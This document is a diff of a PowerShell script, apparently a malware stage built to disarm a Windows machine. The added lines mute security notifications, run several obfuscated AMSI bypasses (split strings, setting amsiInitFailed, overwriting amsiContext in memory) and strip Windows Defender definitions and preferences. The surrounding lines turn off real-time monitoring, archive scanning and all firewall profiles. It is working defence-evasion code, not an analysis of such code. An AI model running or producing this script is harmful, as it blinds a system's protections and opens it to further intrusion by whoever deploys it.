@@ -1,3 +1,21 @@
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance"
+$propertyName = "Enabled"
+$desiredValue = 0
+if (-not (Test-Path $regPath)) {
+    New-Item -Path $regPath -Force | Out-Null
+}
+Set-ItemProperty -Path $regPath -Name $propertyName -Value $desiredValue -Force;
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1 2> $null;
+[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('ams'+'iInitFailed','NonPublic,Static').SetValue($null,$true)
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
+$ananas=[Ref].Assembly.GetTypes();Foreach($banana in $ananas) {if ($banana.Name -like "*iU"+"tils") {$cherry=$banana}};$py=$cherry.GetFields('NonPublic,Static');Foreach($ello in $py) {if ($ello.
+Name -like "*Context") {$ll=$ello}};$j=$ll.GetValue($null);[IntPtr]$ptr=$j;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
+(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true);
+[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True);
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
+cd "C:\Program Files\Windows Defender";
+.\MpCmdRun.exe -removedefinitions -all;
+Remove-MpPreference;
 Set-MpPreference -DisableRealtimeMonitoring $true;
 Set-MpPreference -SubmitSamplesConsent 2;
 Set-MpPreference -DisableArchiveScanning $true;
@@ -18,7 +36,3 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
 Set-NetFirewallProfile -Profile Public -Enabled False;
 Set-NetFirewallProfile -Profile Private -Enabled False;
 Set-NetFirewallProfile -Profile Domain -Enabled False;
-
-
-
-
